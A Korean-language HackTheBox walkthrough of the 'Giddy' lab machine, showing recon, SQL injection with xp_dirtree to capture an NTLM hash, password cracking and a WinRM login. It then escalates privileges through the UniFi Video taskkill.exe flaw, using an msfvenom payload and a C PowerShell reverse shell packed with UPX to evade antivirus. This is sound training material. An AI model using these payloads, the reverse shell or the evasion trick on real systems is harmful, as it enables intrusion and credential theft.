# Giddy - HackTheBox
## Recon
```bash
sudo nmap -p 80,443,3389,5985 -sC -sV -vv -oA giddy 10.129.96.140
```
<img width="1206" height="292" alt="image" src="https://github.com/user-attachments/assets/f3f3f32e-1c5f-4ace-86ac-c72bfafc095d" />
<img width="1206" height="102" alt="image" src="https://github.com/user-attachments/assets/989d30ac-794e-4a31-ab94-88f93ce13dc3" />
<img width="1206" height="102" alt="image" src="https://github.com/user-attachments/assets/28d6b565-aba3-40d5-83a0-fd41bf6f6df5" />

- HTTP(80)
- HTTPS(443)
- RDP(3389)
- WINRM(5985)

---
## HTTP
### banner grabbing
<img width="1206" height="394" alt="image" src="https://github.com/user-attachments/assets/1745f5e9-3d5d-4b51-837f-7e754132c7d2" />

### feroxbuster
- `/mvc` 와 `/remote` 경로 발견.
```bash
feroxbuster -u http://10.129.96.140 -x aspx,md,txt -C 404,405 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
<img width="1206" height="457" alt="image" src="https://github.com/user-attachments/assets/3e03db24-7ed9-49be-a5cb-ce040464e569" />

### SQL Injection
- `/mvc`에서 아무 제품을 클릭하면 `ProductSubCategoryId`의 값에 따라서 출력이 달라짐.
<img width="1220" height="275" alt="image" src="https://github.com/user-attachments/assets/5a46491c-7992-462b-8042-e957e417924b" />

<br>
<br>

- `'`을 끝에 붙이면 오류 메시지 출력.
- `SELECT * FROM items where id='1'`처럼 쿼리를 사용할 것으로 가정.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2cf5846c-35a3-4405-af06-9994ee662d80" />

<br>
<br>

- 어떤 데이터베이스를 사용하는지는 모르나 윈도우 환경이기에 `MSSQL`을 사용한다고 가정.
- `;`를 사용하여 다른 쿼리문을 실행.
- `Responder`를 사용하여 해시 캡쳐.
```bash
sudo responder -I tun0 -v
```
```
1;EXEC xp_dirtree '\\10.10.14.28\test';-- -
```
<img width="773" height="415" alt="image" src="https://github.com/user-attachments/assets/7a01b58e-10e5-4acd-8cf9-2fdc68824e61" />
<img width="1204" height="216" alt="image" src="https://github.com/user-attachments/assets/8215d3a1-bf27-4ac9-8c2b-e12e9616038a" />

<br>
<br>

- 크래킹.
```bash
hashcat hash ~/util/rockyou.txt
```
<img width="1204" height="148" alt="image" src="https://github.com/user-attachments/assets/f53c0152-4689-42ce-b3e8-408cd64fa5d6" />

<br>
<br>

- `stacy:xNnWo6272k7x` 로그인 성공.
```bash
nxc winrm 10.129.96.140 -u stacy -p xNnWo6272k7x
```
<img width="1204" height="199" alt="image" src="https://github.com/user-attachments/assets/ae5fe2af-53cf-4123-bc5b-9406b334b1ce" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.96.140 -u stacy -p xNnWo6272k7x
```
<img width="1204" height="317" alt="image" src="https://github.com/user-attachments/assets/b571ee29-cf89-4a71-bb79-83e0952bc40c" />

---
## Privesc
- `Powershell History`파일 발견.
```powershell
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

Test-Path $historyPath

Get-Content $historyPath
```
<img width="1204" height="271" alt="image" src="https://github.com/user-attachments/assets/712f835a-7fa6-4df5-9416-7f1acf9c65ca" />

<br>
<br>

- `UniFiVideoService`를 실행중.
```powershell
services
```
<img width="1204" height="52" alt="image" src="https://github.com/user-attachments/assets/f419ce08-68a6-4edc-8513-9bed7a8b4d83" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2016-6914
- 버전 정보를 확인할 수는 없으나 권한 상승 취약점 확인.
<img width="1009" height="323" alt="image" src="https://github.com/user-attachments/assets/af92aa97-b849-4b55-82b2-d651667ee9c6" />

<br>
<br>

- https://www.exploit-db.com/exploits/43390
- `c:\programdata\unifi-video`폴더에서 쓰기 권한을 확인.
-  `taskkill.exe`가 기본적으로는 존재하지 않지만 생성하여 서비스를 재시작하면 셸을 획득할 수 있을 것으로 확인.
<img width="701" height="317" alt="image" src="https://github.com/user-attachments/assets/dd801bae-3502-41cd-a9ba-42604efaf183" />

<br>
<br>

- `c:\programdata\unifi-video`폴더에 쓰기 권한 발견.(WD)
```powershell
icacls c:\programdata\unifi-video
```
<img width="1208" height="196" alt="image" src="https://github.com/user-attachments/assets/585641dc-efe2-464f-bc87-6d60a7677591" />

<br>
<br>

- `msfvenom`으로 `taskkill.exe`를 생성.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o taskkill.exe
```
<img width="1208" height="198" alt="image" src="https://github.com/user-attachments/assets/f12f4a77-9d9a-4982-b8aa-57f3918055cd" />

<br>
<br>

- 로컬로부터 다운로드 받아서 서비스를 재시작하였지만 실패.
- `taskkill.exe`가 바이러스로 판단되어 실행 불가.
<img width="1208" height="246" alt="image" src="https://github.com/user-attachments/assets/1abe1bd2-201d-40a2-9e66-1844dcb78cc6" />

<br>
<br>

- https://github.com/CybermonkX/CVE-2016-6914-UniFiVideo-LPE
- 최신 버전의 윈도우에서는 탐지가 되겠지만 과거 버전에서는 실행파일을 패킹하여 우회가 가능.
- `upx`를 사용하여 패킹.
```c
#include <windows.h>

int main() {
    system("powershell -NoP -W Hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.28',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\"");
    return 0;
}
```
```bash
x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe

upx --best --lzma taskkill.exe
```
<img width="1208" height="342" alt="image" src="https://github.com/user-attachments/assets/f39ca6a6-6913-495c-ab0b-02e00e72f03c" />

<br>
<br>

- 로컬로부터 `taskkill.exe`를 다운로드 후 서비스를 재시작.
```powershell
sc.exe stop UniFiVideoService

sc.exe start UniFiVideoService
```
<img width="1208" height="344" alt="image" src="https://github.com/user-attachments/assets/5d02311c-f205-4bf4-a276-65d1892bcdea" />

<br>
<br>

- 셸 획득.
<img width="1204" height="221" alt="image" src="https://github.com/user-attachments/assets/20c22cb7-e3a1-476a-b0cc-94d8166e8c33" />

---
## FLAG
- `c:\users\stacy\desktop\user.txt`
<img width="1204" height="226" alt="image" src="https://github.com/user-attachments/assets/6a6c1772-d69d-4242-aa61-10a7db4bb63b" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1204" height="243" alt="image" src="https://github.com/user-attachments/assets/c1640820-7d9d-4767-8a83-acb2548c20f6" />
